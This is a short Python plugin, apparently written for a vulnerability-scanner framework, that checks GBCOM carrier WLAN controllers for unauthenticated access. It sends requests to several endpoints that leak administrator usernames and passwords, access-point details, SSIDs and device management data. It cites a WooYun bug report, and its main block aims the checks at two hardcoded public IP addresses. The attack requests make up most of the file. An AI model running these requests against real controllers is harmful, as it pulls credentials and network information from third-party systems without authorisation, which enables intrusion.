#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 上海寰创运营商WLAN产品多处未授权访问
refer: http://www.wooyun.org/bugs/wooyun-2010-0121010
description:
    多处未授权访问导致多处信息泄露
'''

import re
import urlparse


def assign(service, arg):
    if service == 'gbcom_wlan':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    #获取账号密码
    url = arg + 'acUser.shtml?method=getList'
    code, head, res, err, _ = curl.curl2(url)
    if (code == 200) and ('<userName>' in res):
        security_hole('管理员密码泄露: ' + url)
    #获取AP信息
    post = 'start=0&limit=1&type=0&value='
    header = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
    url = arg + 'accessApInfo.shtml?method=getAccessAps'
    code, head, res, err, _ = curl.curl2(url, header=header, post=post)
    if (code == 200) and ('<acId>' in res):
        security_warning('AP信息泄露：' + url+ ' POST:' +post)
    #获取WLAN的SSID信息
    post = 'start=0&limit=1'
    #header不变
    url = arg + 'wlanService.shtml?method=getList'
    code, head, res, err, _ = curl.curl2(url, header=header, post=post)
    if (code == 200) and ('<acSsid>' in res):
        security_warning('SSID信息泄露： ' + url + ' POST:' +post)
    #获取AP设备管理信息
    url = arg + 'apConfig.shtml?method=getApCfgList'
    code, head, res, err, _ = curl.curl2(url, header=header, post=post)
    if (code == 200) and ('<apDeviceId>' in res):
        security_warning('AP设备管理信息泄露：' + url + ' POST:' +post)
if __name__ == '__main__':
    from dummy import *
    audit(assign('gbcom_wlan','http://110.17.174.254/')[1])
    audit(assign('gbcom_wlan','http://119.4.167.76/')[1])